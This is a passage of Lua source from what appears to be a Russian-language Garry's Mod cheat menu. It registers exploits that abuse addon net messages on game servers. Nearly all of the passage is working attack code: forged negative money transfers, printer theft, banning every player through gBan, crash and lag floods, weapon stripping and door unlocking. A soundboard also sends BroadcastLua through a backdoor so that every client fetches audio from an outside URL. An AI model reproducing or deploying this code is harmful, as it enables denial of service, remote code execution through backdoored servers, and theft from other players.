	iZNX.NetStart("bodygroups_change")
	net.WriteTable( { 2, Legs[LG] } )
	net.SendToServer()
	iZNX.NetStart("bodygroups_change")
	net.WriteTable( { 3, Hands[HN] } )
	net.SendToServer()
	iZNX.NetStart("bodygroups_change")
	net.WriteTable( { 4, Glasses[GL] } )
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "€ Hitman X €", {
	desc = "Exploit на деньги",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "SendMoney" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent666" },
	{ typ = "players", addr = "l_players_list" },
	{ typ = "func", name = "Дать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_players_list", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	hook.Remove( "HUDPaint", "skhdsakjl")
	iZNX.NetStart( "SendMoney" )
	net.WriteEntity( v )
	net.WriteEntity( v )
	net.WriteEntity( v )
	net.WriteString( -iZNX.GetStored( "montant_argent666" ) )
	net.SendToServer()
	end
	end, },
	{ typ = "func", name = "Забрать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	hook.Remove( "HUDPaint", "skhdsakjl")
	local t = iZNX.GetStored( "l_players_list", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart( "SendMoney" )
	net.WriteEntity( v )
	net.WriteEntity( v )
	net.WriteEntity( v )
	net.WriteString( iZNX.GetStored( "montant_argent666" ) )
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "€ Bail Out €", {
	desc = "Exploit на деньги",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "BailOut" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent16" },
	{ typ = "players", addr = "l_player_liste" },
	{ typ = "func", name = "Дать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_player_liste", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart( "BailOut" )
	net.WriteEntity( LocalPlayer() )
	net.WriteEntity( v )
	net.WriteFloat( -iZNX.GetStored( "montant_argent16" )  )
	net.SendToServer()
	end
	end, },
	{ typ = "func", name = "Забрать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_player_liste", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart( "BailOut" )
	net.WriteEntity( LocalPlayer() )
	net.WriteEntity( v )
	net.WriteFloat( iZNX.GetStored( "montant_argent16" )  )
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "€ Tow Truck €", {
	desc = "Это перевести я не смог",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "TOW_SubmitWarning" ) end,
	functions = {
	{ typ = "func", name = "Spawn МТП", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("TowTruck_CreateTowTruck")
	net.SendToServer()
	end, },
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent17" },
	{ typ = "func", name = "Money Exploit", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(ents.GetAll()) do 
	iZNX.NetStart("TOW_SubmitWarning")
	net.WriteString(LocalPlayer():SteamID())
	net.WriteDouble(-iZNX.GetStored( "montant_argent17" ))
	net.WriteEntity(v)
	net.SendToServer()
	iZNX.NetStart("TOW_PayTheFine")
	net.WriteEntity(v)
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Fire Truck", {
	desc = "Спавн Fire Truck",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "FIRE_CreateFireTruck" ) end,
	functions = {
	{ typ = "func", name = "Заспавнить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("FIRE_CreateFireTruck")
	net.SendToServer()    
	end, },
	},
	} )
	iZNX.AddExploit( "€ Hit Menu €", {
	desc = "Exploit на деньги",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "hitcomplete" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent18" },
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("hitcomplete")
	net.WriteDouble(iZNX.GetStored( "montant_argent18" ))               
	net.SendToServer()      
	end, },
	},
	} )
	iZNX.AddExploit( "€ HHH €", {
	desc = "Exploit на деньги",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "hhh_request" ) end,
	functions = {
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local plyhhh = LocalPlayer()              
	for k,v in pairs(player.GetAll()) do                
	dahater = v   
	end        
	if dahater != plyhhh then       
	local hitRequest = {}
	hitRequest.hitman = plyhhh
	hitRequest.requester = plyhhh
	hitRequest.target = dahater
	hitRequest.reward = -9999999
	iZNX.NetStart( 'hhh_request' )
	net.WriteTable( hitRequest )
	net.SendToServer()
	else
	iZNX.ChatText( "В этой версии HHH невозможно использовать эксплойт !" )    
	end
	end, },
	},
	} )
	iZNX.AddExploit( "€ DaHit €", {
	desc = "Exploit на деньги",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "DaHit" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent20" },
	{ typ = "players", addr = "l_players_listdahit" },
	{ typ = "func", name = "Выдать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_players_listdahit", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	hook.Remove( "HUDPaint", "skhdsakjl")
	iZNX.NetStart( "DaHit" )               
	net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )                            
	net.WriteEntity( v )               
	net.WriteEntity( v )               
	net.WriteEntity( v )               
	net.SendToServer()  
	end  
	end, },
	{ typ = "func", name = "Забрать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_players_listdahit", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	hook.Remove( "HUDPaint", "skhdsakjl")
	iZNX.NetStart( "DaHit" )               
	net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )                            
	net.WriteEntity( v )               
	net.WriteEntity( v )               
	net.WriteEntity( v )               
	net.SendToServer()    
	end
	end, },
	{ typ = "func", name = "Spam выдача", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_spamdahitprendre" ) then
	iZNX.ChatText( "Spam запущен" )
	timer.Create( "Defqon_exploit_spamdahitprendre", 1, 0, function()
	local t = iZNX.GetStored( "l_players_listdahit", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	hook.Remove( "HUDPaint", "skhdsakjl")
	iZNX.NetStart( "DaHit" )               
	net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )                            
	net.WriteEntity( v )               
	net.WriteEntity( v )               
	net.WriteEntity( v )               
	net.SendToServer()    
	end
	end)
	else
	timer.Remove( "Defqon_exploit_spamdahitprendre" )
	iZNX.ChatText( "Spam прекращен" )
	end
	end, },
	{ typ = "func", name = "Spam забиранием", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_spamdahitenlever" ) then
	iZNX.ChatText( "Spam запущен" )
	timer.Create( "Defqon_exploit_spamdahitenlever", 1, 0, function()
	local t = iZNX.GetStored( "l_players_listdahit", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	hook.Remove( "HUDPaint", "skhdsakjl")
	iZNX.NetStart( "DaHit" )               
	net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )                            
	net.WriteEntity( v )               
	net.WriteEntity( v )               
	net.WriteEntity( v )               
	net.SendToServer()    
	end
	end)
	else
	timer.Remove( "Defqon_exploit_spamdahitenlever" )
	iZNX.ChatText( "Spam прекращен" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Anti-Printer", {
	desc = "Наносите постоянный ущерб принтерам по близости",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "customprinter_get" ) end,
	functions = {
	{ typ = "func", name = "Запуск", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_printersmasher" ) then
	iZNX.ChatText( "Anti-Printer запущен" )
	timer.Create( "Defqon_exploit_printersmasher", 0, 0, function()
	for k, v in pairs( ents.GetAll() ) do
	if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
	iZNX.NetStart("customprinter_get")
	net.WriteEntity(v)
	net.WriteString("onoff")
	net.SendToServer()
	end
	end
	end)
	else
	timer.Remove( "Defqon_exploit_printersmasher" )
	iZNX.ChatText( "Anti-Printer остановлен" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Crash the Server", {
	desc = "Краш сервера",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "textstickers_entdata" ) end,
	functions = {
	{ typ = "func", name = "Краш", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart( "textstickers_entdata" )
	net.WriteUInt( 0xFFFFFFF, 32 )
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "Free Ammunition", {
	desc = "Дает вам боеприпасы для всего вашего оружия",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "TCBBuyAmmo" ) end,
	functions = {
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(GAMEMODE.AmmoTypes) do
	iZNX.NetStart("TCBBuyAmmo")
	net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "€ Advanced Money Printer €", {
	desc = "Своровать все деньги из принтеров",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "DataSend" ) end,
	functions = {
	{ typ = "func", name = "Своровать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k, v in pairs( ents.GetAll() ) do
	if v:GetClass() == "adv_moneyprinter" then    
	iZNX.NetStart("DataSend")
	net.WriteFloat(2)
	net.WriteEntity(v)
	net.WriteEntity(LocalPlayer())
	net.SendToServer()
	end
	end
	end, },
	},
	} )
	iZNX.AddExploit( "gBan Ban everyone", {
	desc = "Exploit забанит всех, кроме вас. Был найден в более старой версии gBan",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "gBan.BanBuffer" ) end,
	functions = {
	{ typ = "func", name = "Запуск", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(player.GetAll()) do               
	if v != LocalPlayer() then       
	iZNX.NetStart( "gBan.BanBuffer" )
	net.WriteBool( true )
	net.WriteInt( 0, 32 )
	net.WriteString( "Poutous everywhere" )
	net.WriteString( v:SteamID() )
	net.SendToServer()
	end
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Lag Exploit #1", {
	desc = "Создает лаги на сервере",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
	functions = {
	{ typ = "func", name = "Лаги", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_lagsploit1" ) then
	iZNX.ChatText( "Запускаем лаги" )
	timer.Create( "Defqon_exploit_lagsploit1", 0.02, 0, function()
	for k,v in pairs(player.GetAll()) do
	iZNX.NetStart( "ATS_WARP_REMOVE_CLIENT" )
	net.WriteEntity( v )
	net.WriteString( "adminroom1" )
	net.SendToServer()
	iZNX.NetStart( "ATS_WARP_FROM_CLIENT" )
	net.WriteEntity( v )
	net.WriteString( "adminroom1" )
	net.SendToServer()
	iZNX.NetStart( "ATS_WARP_VIEWOWNER" )
	net.WriteEntity( v )
	net.WriteString( "adminroom1" )
	net.SendToServer()
	end
	end)
	else
	timer.Remove( "Defqon_exploit_lagsploit1" )
	iZNX.ChatText( "Прекращаем лаги" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Console Spam", {
	desc = "Засоряет консоль сообщениями Seized ",
	severity = 1,
	scan = function() return ULib end,
	functions = {
	{ typ = "func", name = "Спам", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_bigspames2" ) then
	iZNX.ChatText( "Запускаем спам" )
	timer.Create( "Defqon_exploit_bigspames2", 0, 0, function()
	for i = 1, 200 do
	LocalPlayer():ConCommand( "_u Seized kuskom govnica xD " )
	end
	end)
	else
	timer.Remove( "Defqon_exploit_bigspames2" )
	iZNX.ChatText( "Прекращаем спам" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Lag Exploit #2", {
	desc = "Exploit для создания лагов на сервере",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "Keypad" ) end,
	functions = {
	{ typ = "func", name = "Лаги", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_lagsploit4" ) then
	iZNX.ChatText( "Запускаем лаги" )
	timer.Create( "Defqon_exploit_lagsploit4", 0, 0, function()
	for i = 1, 1000 do
	iZNX.NetStart("Keypad")
	net.WriteEntity(LocalPlayer())
	net.SendToServer()
	end
	end)
	else
	timer.Remove( "Defqon_exploit_lagsploit4" )
	iZNX.ChatText( "Прекращаем лаги" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Lag Exploit #3", {
	desc = "Сделать лаги на сервере, перемещая сервер на хост Африки",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "CreateCase" ) end,
	functions = {
	{ typ = "func", name = "Лаги", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_lagsploit5" ) then
	iZNX.ChatText( "Запускаем лаги" )
	timer.Create( "Defqon_exploit_lagsploit5", 0.02, 0, function()
	for i = 1, 300 do
	iZNX.NetStart( "CreateCase" )
	net.WriteString( "Bitch please" )
	net.SendToServer()
	end
	end)
	else
	timer.Remove( "Defqon_exploit_lagsploit5" )
	iZNX.ChatText( "Прекращаем лаги" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Lag Exploit #4", {
	desc = "Exploit для создания лагов на сервере",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "rprotect_terminal_settings" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_lagsploit6" ) then
	iZNX.ChatText( "Запускаем лаги" )
	timer.Create( "Defqon_exploit_lagsploit6", 0.02, 0, function()
	for i = 1, 200 do
	iZNX.NetStart( "rprotect_terminal_settings" )
	net.WriteEntity( LocalPlayer() )
	net.SendToServer()
	end
	end)
	else
	timer.Remove( "Defqon_exploit_lagsploit6" )
	iZNX.ChatText( "Прекращаем лаги" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Lag Exploit #5", {
	desc = "Exploit для создания лагов на сервере",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "StackGhost" ) end,
	functions = {
	{ typ = "func", name = "Лаги", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_lagsploit7" ) then
	iZNX.ChatText( "Запускаем лаги" )
	timer.Create( "Defqon_exploit_lagsploit7", 0.015, 0, function()
	for i = 1, 8 do
	for k,v in pairs( player.GetAll() ) do
	iZNX.NetStart( "StackGhost" )
	net.WriteInt(69,32)
	net.SendToServer()
	end
	end
	end)
	else
	timer.Remove( "Defqon_exploit_lagsploit7" )
	iZNX.ChatText( "Прекращаем лаги" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Reanimation Exploit", {
	desc = "Вы автоматически воскресаете после смерти",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "RevivePlayer" ) end,
	functions = {
	{ typ = "func", name = "Бессмертие", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_zombie" ) then
	iZNX.ChatText( "Ты бессмертен" )
	timer.Create( "Defqon_exploit_zombie", 0.5, 0, function()
	if !LocalPlayer():Alive() then
	iZNX.NetStart("RevivePlayer")
	net.WriteEntity(LocalPlayer())
	net.SendToServer()
	end
	end)
	else
	timer.Remove( "Defqon_exploit_zombie" )
	iZNX.ChatText( "Ты снова смертен!" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Armory Robbery", {
	desc = "Возьмите оружие из арсенала полиции (вы должны быть рядом с ним) кулдаун 5 минут",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
	functions = {
	{ typ = "func", name = "Взять оружие #1", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("ARMORY_RetrieveWeapon")
	net.WriteString("weapon1")
	net.SendToServer()
	end, },
	{ typ = "func", name = "Взять оружие #2", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("ARMORY_RetrieveWeapon")
	net.WriteString("weapon2")
	net.SendToServer()
	end, },
	{ typ = "func", name = "Взять оружие #3", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("ARMORY_RetrieveWeapon")
	net.WriteString("weapon3")
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "Admin Stick | Door exploit", {
	desc = "Открыть / Закрыть дверь / Удалить владельца (вы должны смотреть на дверь)",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "fp_as_doorHandler" ) end,
	functions = {
	{ typ = "func", name = "Открыть", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("fp_as_doorHandler")
	net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	net.WriteString("unlock")
	net.SendToServer()
	end, },
	{ typ = "func", name = "Закрыть", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("fp_as_doorHandler")
	net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	net.WriteString("lock")
	net.SendToServer()
	end, },
	{ typ = "func", name = "Удалить владельца", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local door = LocalPlayer():GetEyeTrace().Entity
	local doorOwner = door:getDoorData()["owner"]
	iZNX.NetStart("fp_as_doorHandler")
	net.WriteEntity(door)
	net.WriteString("removeOwner")
	net.WriteDouble(doorOwner)
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "Defqon Report Spammer", {
	desc = "Report спаммер",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "TransferReport" ) end,
	functions = {
	{ typ = "func", name = "Зарепортить всех", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k, v in pairs( player.GetAll() ) do
	iZNX.NetStart( "TransferReport" )
	net.WriteString( v:SteamID() )
	net.WriteString( "SERVER CODER BY Q" )
	net.WriteString( "Bitch please" )
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "SAC Crash", {
	desc = "Мгновенный краш сервера, использующего SAC анти-чит",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "SimplicityAC_aysent" ) end,
	functions = {
	{ typ = "func", name = "Краш", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local tbl = {}
	for i=1,400 do
	tbl[i] = i
	end
	iZNX.NetStart("SimplicityAC_aysent")
	net.WriteUInt(1, 8)
	net.WriteUInt(4294967295, 32)
	net.WriteTable(tbl)
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "Server Crash", {
	desc = "Нажмите эту кнопку, чтобы мгновенно крашнуть сервер, на 99.9% не работает",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "pac_to_contraption" ) end,
	functions = {
	{ typ = "func", name = "Краш", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local tbl = {}
	for i=1,1000000000 do
	tbl[#tbl + 1] = i
	end
	iZNX.NetStart("pac_to_contraption")
	net.WriteTable( tbl )
	net.SendToServer()
	end, },
	},
	} )
	local function nukeweapon( ent )
	if !ent:IsValid() then return end
	if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
	iZNX.NetStart("properties")
	net.WriteString("remove")
	net.WriteEntity( ent )
	net.SendToServer()
	ent.LNextNuke = CurTime() + 0.5
	end
	local function nukeallweapons( tab )
	for k, v in pairs( tab ) do
	if !v:IsValid() then continue end
	if v.LNextNuke and v.LNextNuke > CurTime() then continue end
	iZNX.NetStart("properties")
	net.WriteString("remove")
	net.WriteEntity( v )
	net.SendToServer()
	end
	end
	iZNX.AddExploit( "Strip the weapons", {
	desc = "Strip оружия у любого игрока.",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
	functions = {
	{ typ = "string", name = "Тип оружия", default = "*", addr = "stripper_gunz" },
	{ typ = "players", addr = "stripper_plyz" },
	{ typ = "func", name = "Стрип", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "stripclub" ) then
	iZNX.ChatText( "Strip запущен" )
	timer.Create( "stripclub", 0.5, 0, function()
	local t = iZNX.GetStored( "stripper_plyz", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	local gunz = v:GetWeapons()
	local findstring = iZNX.GetStored( "stripper_gunz", "*" )
	if findstring == "*" then nukeallweapons( gunz ) return end
	local findstringtab = string.Explode( ", ", findstring )
	for _, g in pairs( gunz ) do
	for _, s in pairs( findstringtab ) do
	if string.find( string.lower( g:GetClass() ), s ) then
	nukeweapon( g )
	end
	end
	end
	end
	end)
	else
	timer.Remove( "stripclub" )
	iZNX.ChatText( "Strip остановлен" )
	end
	end, },
	},
	} )
	------------------------------------------------------------------------------------------------------------------------------------------------
	function iZNX.MakeFunctionButtonr( parent, x, y, btext, func, tooltip)
	if !parent:IsValid() then return end
	local TButton = vgui.Create( "DButton" )
	TButton:SetParent( parent )
	TButton:SetPos( x, y )
	TButton:SetText( btext )
	TButton:SetTextColor( Color(255, 0, 0, 255) ) -- Цвет текста на кнопках
	TButton:SizeToContents()
	TButton:SetTall( 24 )
	if tooltip then TButton:SetToolTip( tooltip ) end
	TButton.Paint = function( self, w, h )
	surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Цвет кнопок
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Цвет верхней части кнопок
	surface.SetMaterial( downgrad )
	surface.DrawTexturedRect( 0, 0, w, h/ 2 )
	surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
	surface.DrawOutlinedRect( 0, 0, w, h )
	end
	TButton.DoClick = function()
	func()
	end
	return TButton:GetWide(), TButton:GetTall()
	end
	function iZNX.MakeFunctionButtonb( parent, x, y, btext, func, tooltip)
	if !parent:IsValid() then return end
	local TButton = vgui.Create( "DButton" )
	TButton:SetParent( parent )
	TButton:SetPos( x, y )
	TButton:SetText( btext )
	TButton:SetTextColor( Color(9, 173, 181, 255) ) -- Цвет текста на кнопках
	TButton:SizeToContents()
	TButton:SetTall( 24 )
	if tooltip then TButton:SetToolTip( tooltip ) end
	TButton.Paint = function( self, w, h )
	surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Цвет кнопок
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Цвет верхней части кнопок
	surface.SetMaterial( downgrad )
	surface.DrawTexturedRect( 0, 0, w, h/ 2 )
	surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
	surface.DrawOutlinedRect( 0, 0, w, h )
	end
	TButton.DoClick = function()
	func()
	end
	return TButton:GetWide(), TButton:GetTall()
	end
	function iZNX.MakeFunctionButton( parent, x, y, btext, func, tooltip)
	if !parent:IsValid() then return end
	local TButton = vgui.Create( "DButton" )
	TButton:SetParent( parent )
	TButton:SetPos( x, y )
	TButton:SetText( btext )
	TButton:SetTextColor( Color(255, 255, 255, 255) ) -- Цвет текста на кнопках
	TButton:SizeToContents()
	TButton:SetTall( 24 )
	if tooltip then TButton:SetToolTip( tooltip ) end
	TButton.Paint = function( self, w, h )
	surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Цвет кнопок
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Цвет верхней части кнопок
	surface.SetMaterial( downgrad )
	surface.DrawTexturedRect( 0, 0, w, h/ 2 )
	surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
	surface.DrawOutlinedRect( 0, 0, w, h )
	end
	TButton.DoClick = function()
	func()
	end
	return TButton:GetWide(), TButton:GetTall()
	end
	-------------------------------------------------------------------------
	function iZNX.SoundBoard( parent, x, y, btext )
	if !parent:IsValid() then return end
	local TButton = vgui.Create( "DButton" )
	TButton:SetParent( parent )
	TButton:SetPos( x, y )
	TButton:SetText( btext )
	TButton:SetTextColor( Color(255, 255, 255, 255) )
	TButton:SizeToContents()
	TButton:SetTall( 24 )
	TButton.Paint = function( self, w, h )
	surface.SetDrawColor( Color(100, 60, 60, 200) )
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color( 60, 60, 60 ) )
	surface.SetMaterial( downgrad )
	surface.DrawTexturedRect( 0, 0, w, h/ 2 )
	surface.SetDrawColor( Color(100, 100, 100, 255) )
	surface.DrawOutlinedRect( 0, 0, w, h )
	surface.SetDrawColor( Color(110, 70, 70, 255) )
	surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
	end
	TButton.DoClick = function()
	iZNX.Sound()
	end
	return TButton:GetWide(), TButton:GetTall()
	end
	function iZNX.Sound()
	if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
	iZNX.HTXCommandeSelector = vgui.Create("DFrame")
	iZNX.HTXCommandeSelector:SetSize(240,350)
	iZNX.HTXCommandeSelector:SetTitle("Воспроизведение Звуков")
	iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
	iZNX.HTXCommandeSelector:MakePopup()
	iZNX.HTXCommandeSelector.Paint = function( s, w, h )
	if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
	surface.SetDrawColor( Color(30, 30, 30, 245) )
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color(55, 55, 55, 245) )
	surface.DrawOutlinedRect( 0, 0, w, h )
	surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
	end
	local DScrollPanel = vgui.Create( "DScrollPanel", iZNX.HTXCommandeSelector )
	DScrollPanel:Dock( FILL )
	local sound1 = vgui.Create("DButton", DScrollPanel)
	sound1:SetSize( 208, 20 )
	sound1:SetPos( 2, 0 )
	sound1:SetText("Порно звуки")
	sound1:SetTextColor(Color(255, 255, 255, 255))
	sound1.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	sound1.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/33i6.mp3\", \"mono\", function()end )]])" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local sound2 = vgui.Create("DButton", DScrollPanel)
	sound2:SetSize( 208, 20 )
	sound2:SetPos( 2, 25 )
	sound2:SetText("Чё пацаны, аниме? OVER9000 BASS")
	sound2:SetTextColor(Color(255, 255, 255, 255))
	sound2.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	sound2.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/5maL.mp3\", \"mono\", function()end )]])" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local sound3 = vgui.Create("DButton", DScrollPanel)
	sound3:SetSize( 208, 20 )
	sound3:SetPos( 2, 50 )
	sound3:SetText("Ор из Зеленого Слоника (-уши)")
	sound3:SetTextColor(Color(255, 255, 255, 255))
	sound3.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	sound3.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/62xu.mp3\", \"mono\", function()end )]])" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local sound4 = vgui.Create("DButton", DScrollPanel)
	sound4:SetSize( 208, 20 )
	sound4:SetPos( 2, 75 )
